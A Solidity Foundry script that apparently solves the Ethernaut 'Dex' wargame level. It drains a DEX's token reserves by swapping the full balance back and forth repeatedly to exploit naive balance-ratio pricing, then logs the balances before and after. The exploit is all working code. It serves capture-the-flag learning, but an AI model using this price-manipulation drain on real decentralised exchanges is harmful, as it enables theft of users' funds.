// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/22_DEX.sol";

contract POC is Script {
    Dex public target;
    SwappableToken public token1;
    SwappableToken public token2;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = Dex(0xB27CFf0aD83b4d339FDB36B9246Ec514De203691);

        address token1_addr = target.token1();
        address token2_addr = target.token2();
        token1 = SwappableToken(token1_addr);
        token2 = SwappableToken(token2_addr);

        uint256 balance1 = token1.balanceOf(address(target));
        uint256 balance2 = token2.balanceOf(address(target));

        console.log("before balance1: ", balance1);
        console.log("before balance2: ", balance2);

        token1.approve(address(target), 2**256 - 1);
        token2.approve(address(target), 2**256 - 1);

        swapMax(token1, token2);
        swapMax(token2, token1);
        swapMax(token1, token2);
        swapMax(token2, token1);
        swapMax(token1, token2);

        target.swap(address(token2), address(token1), 45);

        balance1 = token1.balanceOf(address(target));
        balance2 = token2.balanceOf(address(target));

        console.log("after  balance1: ", balance1);
        console.log("after  balance2: ", balance2);

        vm.stopBroadcast();
    }

    function swapMax(ERC20 tokenIn, ERC20 tokenOut) public {
       target.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(vm.envAddress("MY_ADDRESS")));
    }
}